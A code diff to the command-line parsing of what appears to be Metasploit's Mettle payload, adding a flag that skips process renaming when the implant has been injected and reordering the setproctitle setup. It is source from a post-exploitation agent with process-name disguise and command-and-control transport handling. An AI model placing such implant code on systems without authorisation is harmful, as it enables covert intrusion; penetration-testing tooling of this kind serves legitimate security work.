@@ -43,7 +43,8 @@ static void start_logger(const char *out)
 	log_init_flush_thread();
 }
 
-static int parse_cmdline(int argc, char * const argv[], struct mettle *m)
+#define PAYLOAD_INJECTED (1 << 0)
+static int parse_cmdline(int argc, char * const argv[], struct mettle *m, int flags)
 {
 	int c = 0;
 	int index = 0;
@@ -139,7 +140,12 @@ static int parse_cmdline(int argc, char * const argv[], struct mettle *m)
 		start_logger(out);
 	}
 
-	if (name_flag) {
+	/*
+	 * Only rename if we were not injected, since currently we do not know
+	 * where the real argv is. This is fixable, but possibly not useful to
+	 * rename an injected process :)
+	 */
+	if (name_flag && !(flags & PAYLOAD_INJECTED)) {
 		log_info("using name: %s", name);
 		setproctitle(name);
 	}
@@ -166,7 +172,7 @@ static int parse_cmdline(int argc, char * const argv[], struct mettle *m)
 	return 0;
 }
 
-void parse_default_args(struct mettle *m)
+void parse_default_args(struct mettle *m, int flags)
 {
 	static char default_opts[] = "DEFAULT_OPTS"
 		"                                                  "
@@ -215,7 +221,7 @@ void parse_default_args(struct mettle *m)
 		char **argv = NULL;
 		argv = argv_split(default_opts, argv, &argc);
 		if (argv) {
-			parse_cmdline(argc, argv, m);
+			parse_cmdline(argc, argv, m, flags);
 		}
 	}
 }
@@ -231,6 +237,7 @@ char *get_progname(char *argv0);
 
 int main(int argc, char * argv[])
 {
+	int flags = 0;
 	__progname = get_progname(argv[0]);
 
 	/*
@@ -247,20 +254,12 @@ int main(int argc, char * argv[])
 		return 1;
 	}
 
-#ifndef HAVE_SETPROCTITLE
-	/* Prepare for later setproctitle emulation */
-	saved_argv = calloc(argc + 1, sizeof(*saved_argv));
-	for (int i = 0; i < argc; i++) {
-		saved_argv[i] = strdup(argv[i]);
-	}
-	compat_init_setproctitle(argc, argv);
-	argv = saved_argv;
-#endif
-
 	/*
 	 * Check to see if we were injected by metasploit
 	 */
 	if (strcmp(argv[0], "m") == 0) {
+		flags |= PAYLOAD_INJECTED;
+
 		/*
 		 * There is a fd sitting here, trust me
 		 */
@@ -271,10 +270,21 @@ int main(int argc, char * argv[])
 			c2_add_transport_uri(c2, uri);
 			free(uri);
 		}
-		parse_default_args(m);
+		parse_default_args(m, flags);
 	} else {
-		parse_default_args(m);
-		if (parse_cmdline(argc, argv, m)) {
+
+#ifndef HAVE_SETPROCTITLE
+		/* Prepare for later setproctitle emulation */
+		saved_argv = calloc(argc + 1, sizeof(*saved_argv));
+		for (int i = 0; i < argc; i++) {
+			saved_argv[i] = strdup(argv[i]);
+		}
+		compat_init_setproctitle(argc, argv);
+		argv = saved_argv;
+#endif
+
+		parse_default_args(m, flags);
+		if (parse_cmdline(argc, argv, m, flags)) {
 			return -1;
 		}
 	}
